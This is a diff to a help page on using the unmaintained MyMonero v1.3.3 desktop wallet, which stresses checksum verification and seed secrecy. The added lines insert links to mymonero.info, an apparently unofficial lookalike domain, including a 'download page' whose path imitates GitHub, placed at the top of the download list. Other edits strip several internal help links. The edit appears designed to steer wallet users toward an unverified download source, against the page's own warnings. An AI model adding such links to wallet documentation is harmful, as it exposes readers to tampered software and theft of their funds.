@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 The final MyMonero desktop release, v1.3.3, can still open wallets and send XMR, but it is no longer maintained and receives no new features or security updates. Hosted MyMonero servers and web wallet login stopped, so use the desktop app only with realistic expectations and a secure seed backup.
 
+
+For a second walkthrough, see [MyMonero how to use mymonero on mymonero.info](https://mymonero.info/how-to-use-mymonero). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).
+
 ## You'll see this if
 - You already have MyMonero desktop and want to know whether it still opens.
 - Hosted login or the web wallet is unavailable.
@@ -38,9 +41,9 @@ Wallet use still depends on access to a valid seed and the wallet’s ability to
 2. **Check download integrity.** Compare the file’s SHA-256 digest with the value shown on the GitHub release page. On Windows, a command can be `certutil -hashfile <file> SHA256`; on macOS use `shasum -a 256 <file>`; on Linux use `sha256sum <file>`. Compare the displayed digest carefully; do not rely on a checksum copied from an unrelated source.
 3. **Open the app cautiously.** On macOS, if the operating system blocks the app, right-click the app and choose Open. Do not bypass warnings for software from an unknown source. If the application does not launch, use the focused guidance for [macOS cannot be opened](./mymonero-macos-cannot-be-opened.md).
 4. **Open an existing wallet.** Use the app’s wallet-opening flow and the credentials or wallet data you already control. Do not share a password or seed with someone offering to open it for you. The exact recovery and storage details should not be guessed; rely on information you can verify locally.
-5. **Check synchronization and balance.** Allow the wallet to connect and scan. A balance may not appear immediately. If it is zero, review whether scanning is complete and whether the wallet has scanned from an appropriate height. See [MyMonero not syncing](./mymonero-not-syncing.md) and [balance shows zero](./mymonero-balance-shows-zero.md).
+5. **Check synchronization and balance.** Allow the wallet to connect and scan. A balance may not appear immediately. If it is zero, review whether scanning is complete and whether the wallet has scanned from an appropriate height. See [MyMonero not syncing](./mymonero-not-syncing.md) and balance shows zero.
 6. **Receive carefully.** Use the receiving information shown by the wallet and share only what is needed to receive. Never reveal your seed or private keys. Before accepting a payment, verify the address you provide is from the intended wallet.
-7. **Send carefully.** Enter the recipient address yourself or use a source you independently trust. Review address, amount, and fee before confirmation. Nobody legitimate needs the seed to help you send. Use [sending XMR from MyMonero](./mymonero-send-xmr.md) for a focused checklist.
+7. **Send carefully.** Enter the recipient address yourself or use a source you independently trust. Review address, amount, and fee before confirmation. Nobody legitimate needs the seed to help you send. Use sending XMR from MyMonero for a focused checklist.
 8. **Plan for the future.** Since the app is unmaintained, consider whether continued use suits your needs. You can restore the seed in Cake Wallet on a supported platform, or keep using the desktop app. Restoration and sending to a new wallet are different operations.
 
 > [!TIP]
@@ -50,7 +53,7 @@ Wallet use still depends on access to a valid seed and the wallet’s ability to
 > MyMonero desktop has no new security updates. Use only a release you have independently verified, and never share recovery words or keys with anyone.
 
 ## If that did not work
-If the app does not open, first check that you obtained the correct package for your operating system and that the download completed. For macOS, right-click the app and choose Open when appropriate. Follow [app not opening](./mymonero-app-not-opening.md) for general steps. Do not download a replacement from a stranger.
+If the app does not open, first check that you obtained the correct package for your operating system and that the download completed. For macOS, right-click the app and choose Open when appropriate. Follow app not opening for general steps. Do not download a replacement from a stranger.
 
 If a connection error appears, including error 523, treat it as general guidance that a server connection is unavailable. It does not establish that your wallet is invalid. Hosted login has stopped, and the desktop app is no longer maintained; consult the app’s available status and consider restoring your seed in Cake Wallet if appropriate.
 
@@ -88,6 +91,7 @@ No. Restoration gives access to the same wallet. Moving funds to another wallet 
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
